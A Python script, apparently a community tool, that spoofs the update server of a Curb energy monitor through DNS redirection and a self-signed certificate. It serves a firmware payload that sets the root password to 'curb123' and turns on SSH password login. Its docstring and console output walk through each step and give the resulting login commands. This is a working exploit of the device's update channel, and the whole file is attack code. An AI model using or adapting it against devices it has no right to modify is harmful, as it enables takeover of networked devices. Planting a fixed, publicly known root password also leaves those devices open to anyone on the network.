#!/usr/bin/env python3
"""
Curb Energy Monitor — Community Root Access Server

Serves a firmware update payload that changes the root password to 'curb123'
and enables SSH password login.

Prerequisites:
  1. Redirect 'updates.energycurb.com' to this machine's IP in your DNS
     (Pi-hole: Local DNS → DNS Records → updates.energycurb.com → your IP)
  2. Run this script on the machine that DNS points to
  3. Wait up to 90 minutes for the Curb to check for updates

Usage:
  python3 serve.py

The server runs on ports 443 (HTTPS) and 80 (HTTP).
After the update, log in with:
  Serial: root / curb123 (115200 8N1 on J6 header)
  SSH:    ssh -o PubkeyAcceptedAlgorithms=+ssh-rsa root@<curb-ip>
"""

import http.server
import ssl
import os
import sys
import subprocess
import threading
from datetime import datetime

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
SERVE_DIR = os.path.join(SCRIPT_DIR, 'webroot')

# Required files
REQUIRED = [
    'os.tar.gz.gpg', 'os.tar.gz.gpg.md5sum',
    'update.tar.gz.gpg', 'update.tar.gz.gpg.md5sum'
]


def setup_webroot():
    """Create the directory structure the Curb's update script expects."""
    os.makedirs(os.path.join(SERVE_DIR, 'api/firmware'), exist_ok=True)

    for f in REQUIRED:
        src = os.path.join(SCRIPT_DIR, f)
        if not os.path.exists(src):
            print(f"ERROR: Missing {src}")
            print("Make sure all payload files are in the same directory as this script.")
            sys.exit(1)

        # Copy to generic path
        dst = os.path.join(SERVE_DIR, 'api/firmware', f)
        if not os.path.exists(dst):
            os.link(src, dst)

    print(f"Serving from {SERVE_DIR}")
    print("Files:")
    for f in REQUIRED:
        print(f"  /api/firmware/{f}")
        # The device also tries /api/firmware/<serial>/<file>
        # SimpleHTTPRequestHandler won't match, but the fallback to
        # generic path will work since the device tries both.
    print()


def generate_cert():
    """Generate a self-signed cert for HTTPS."""
    cert = os.path.join(SCRIPT_DIR, 'server.pem')
    key = os.path.join(SCRIPT_DIR, 'server.key')

    if not os.path.exists(cert):
        print("Generating self-signed certificate...")
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
            '-keyout', key, '-out', cert,
            '-days', '365', '-nodes',
            '-subj', '/CN=updates.energycurb.com'
        ], capture_output=True, check=True)

    return cert, key


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=SERVE_DIR, **kwargs)

    def log_message(self, format, *args):
        msg = format % args
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client = self.client_address[0]

        # Highlight requests from Curb devices (not localhost)
        if client not in ('127.0.0.1', '::1') and 'update.tar.gz.gpg' in msg and '200' in msg:
            print(f"\033[92m[{timestamp}] {client} - {msg}\033[0m")
            print(f"\033[92m  *** PAYLOAD DELIVERED! The device will reboot and apply changes. ***\033[0m")
            print(f"\033[92m  *** Wait 2-3 minutes, then: ssh root@{client} (password: curb123) ***\033[0m")
        else:
            print(f"[{timestamp}] {client} - {msg}")

    def do_GET(self):
        # Handle serial-specific paths by redirecting to generic
        # /api/firmware/<serial>/file → /api/firmware/file
        parts = self.path.strip('/').split('/')
        # ['api', 'firmware', '<serial>', '<file>']
        if len(parts) == 4 and parts[0] == 'api' and parts[1] == 'firmware':
            generic = f"/api/firmware/{parts[3]}"
            if os.path.exists(os.path.join(SERVE_DIR, generic.lstrip('/'))):
                self.path = generic

        super().do_GET()


def run_server(port, ssl_context=None):
    server = http.server.HTTPServer(('0.0.0.0', port), Handler)
    if ssl_context:
        server.socket = ssl_context.wrap_socket(server.socket, server_side=True)
    proto = "HTTPS" if ssl_context else "HTTP"
    print(f"  {proto} server listening on port {port}")
    server.serve_forever()


def main():
    print("=" * 60)
    print("  Curb Energy Monitor — Community Root Access Server")
    print("=" * 60)
    print()

    setup_webroot()
    cert, key = generate_cert()

    # HTTPS on 443
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key)
    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1
    except Exception:
        pass

    print("Starting servers...")
    t_https = threading.Thread(target=run_server, args=(443, ctx), daemon=True)
    t_http = threading.Thread(target=run_server, args=(80, None), daemon=True)
    t_https.start()
    t_http.start()

    print()
    print("Waiting for Curb device to check for updates...")
    print("The device checks hourly (+ random 0-30 min delay).")
    print("You may need to reboot the Curb to trigger an immediate check.")
    print()
    print("How it works:")
    print("  1. Device downloads OS checksum → sees 'new' version")
    print("  2. Downloads + decrypts dummy OS update → harmless, device reboots")
    print("  3. Device downloads software checksum → sees 'new' version")
    print("  4. Downloads + decrypts our payload → changes password + enables SSH")
    print("  5. Device reboots → log in with root / curb123")
    print()
    print("Press Ctrl+C to stop.\n")

    try:
        while True:
            t_https.join(1)
    except KeyboardInterrupt:
        print("\nStopping.")


if __name__ == '__main__':
    main()
